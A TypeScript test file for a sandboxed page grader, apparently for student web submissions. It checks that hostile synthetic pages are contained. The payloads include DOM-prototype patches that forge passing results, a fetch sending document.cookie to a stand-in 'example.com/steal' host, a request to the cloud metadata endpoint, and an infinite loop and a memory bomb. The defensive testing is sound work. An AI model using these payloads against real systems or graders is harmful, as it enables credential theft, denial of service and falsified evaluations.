/**
 * Browser attempts with SYNTHETIC pages: correct, broken, hostile. Assertions run outside the sandbox, so a page
 * cannot read expected values or forge a pass by patching the DOM APIs a test uses.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { calibrateLimits } from '@naqla/domain';
import { probeBackend } from './sandbox.js';
import { runAttempt } from './run.js';
import { demoPack } from './packs/demo.js';

const probe = probeBackend();
const skip = probe.available ? false : `development backend unavailable here: ${probe.reasons.join('; ')}`;
const sha = 'b'.repeat(40);
const page = (body: string, script = '') => [{ path: 'index.html', content: `<!doctype html><html lang="ar" dir="rtl"><head><meta name="viewport" content="width=device-width"></head><body>${body}<script>${script}</script></body></html>` }];
const GOOD = page(`<h1>العنوان</h1><button id="inc">+</button><span id="count">0</span>`, `let n=0;document.querySelector('#inc').addEventListener('click',()=>{n++;document.querySelector('#count').textContent=String(n)});`);
const outcomes = (r: { tests: readonly { testId: string; outcome: string }[] }) => Object.fromEntries(r.tests.map((t) => [t.testId, t.outcome]));

test('a correct synthetic page passes and the result is bound to the commit and snapshot', { skip }, async () => {
  const r = await runAttempt({ pack: demoPack, files: GOOD, commitSha: sha, origin: 'synthetic' });
  assert.equal(r.status, 'completed');
  assert.deepEqual(outcomes(r), { 'functional.heading': 'pass', 'responsive.page_width_360': 'pass', 'functional.counter': 'pass' });
  assert.equal(r.commitSha, sha);
  assert.match(r.snapshotHash, /^sha256:[0-9a-f]{64}$/);
  assert.equal(r.backend, 'namespace-dev');
});

test('a broken synthetic page fails the right tests (wide layout, dead button)', { skip }, async () => {
  const r = await runAttempt({ pack: demoPack, origin: 'synthetic', commitSha: null,
    files: page(`<h1>العنوان</h1><div style="width:900px">جدول</div><button id="inc">+</button><span id="count">0</span>`, `document.querySelector('.inc')?.addEventListener('click',()=>{});`) });
  assert.deepEqual(outcomes(r), { 'functional.heading': 'pass', 'responsive.page_width_360': 'fail', 'functional.counter': 'fail' });
  assert.match(r.tests.find((t) => t.testId === 'responsive.page_width_360')!.noteAr ?? '', /عرض المحتوى \d+ على شاشة 360/);
});

test('forgery: a page that patches DOM APIs to fake a pass is still measured truthfully', { skip }, async () => {
  const r = await runAttempt({ pack: demoPack, origin: 'synthetic', commitSha: null, files: page(
    `<h1></h1><div style="width:900px">x</div><span id="count">0</span>`,
    `const real = Document.prototype.querySelector;
     Document.prototype.querySelector = function (s) { if (s === 'h1') return { textContent: 'مزيف' }; if (s === '#count') return { textContent: '2' }; return real.call(this, s); };
     Element.prototype.getBoundingClientRect = () => ({ width: 300, height: 10, top: 0, left: 0, right: 300, bottom: 10 });
     Object.defineProperty(document.documentElement, 'scrollWidth', { get: () => 360 });
     window.getComputedStyle = () => ({ outlineStyle: 'solid', outlineWidth: '3px' });`) });
  const o = outcomes(r);
  assert.equal(o['functional.heading'], 'fail');
  assert.equal(o['responsive.page_width_360'], 'fail');
  assert.notEqual(o['functional.counter'], 'pass');
  assert.ok(r.gamingSignals.includes('prototype_patch'));
  assert.ok(r.gamingSignals.includes('computed_style_override'));
});

test('exfiltration: requests to the platform, loopback or the internet are blocked and counted', { skip }, async () => {
  const r = await runAttempt({ pack: demoPack, origin: 'synthetic', commitSha: null, files: page(`<h1>ع</h1><button id="inc">+</button><span id="count">0</span>`,
    `for (const u of ['http://127.0.0.1:55432/', 'http://localhost:3000/v1/me', 'https://example.com/steal?d=' + document.cookie]) fetch(u).catch(()=>{});
     new Image().src = 'http://169.254.169.254/latest/meta-data/';
     let n=0;document.querySelector('#inc').addEventListener('click',()=>{n++;document.querySelector('#count').textContent=String(n)});`) });
  assert.ok(r.blockedRequests >= 4, `blocked ${r.blockedRequests}`);
  assert.equal(r.status, 'completed');
});

test('a hanging page times out per test; the attempt still finishes and cleans up', { skip }, async () => {
  const limits = calibrateLimits({ perTestSeconds: 3, wallSeconds: 40 });
  const r = await runAttempt({ pack: demoPack, origin: 'synthetic', commitSha: null, limits,
    files: page(`<h1>ع</h1><button id="inc">+</button><span id="count">0</span>`, `document.querySelector('#inc').addEventListener('click',()=>{ for(;;){} });`) });
  const o = outcomes(r);
  assert.ok(o['functional.counter'] === 'timeout' || o['functional.counter'] === 'error', o['functional.counter']);
  assert.equal(o['functional.heading'], 'pass');
});

test('a memory bomb page cannot take the host down: the attempt ends with bounded results', { skip }, async () => {
  const limits = calibrateLimits({ memoryMiB: 384, perTestSeconds: 6, wallSeconds: 60 });
  const r = await runAttempt({ pack: demoPack, origin: 'synthetic', commitSha: null, limits,
    files: page(`<h1>ع</h1><button id="inc">+</button><span id="count">0</span>`, `document.querySelector('#inc').addEventListener('click',()=>{ const a=[]; for(;;) a.push(new Array(1e6).fill(Math.random())); });`) });
  assert.notEqual(outcomes(r)['functional.counter'], 'pass');
  assert.ok(['completed', 'crashed', 'timeout'].includes(r.status));
});

test('graduate code is refused before the security review is approved', async () => {
  await assert.rejects(runAttempt({ pack: demoPack, files: GOOD, commitSha: sha, origin: 'graduate' }), /r2_real_code_not_approved/);
});
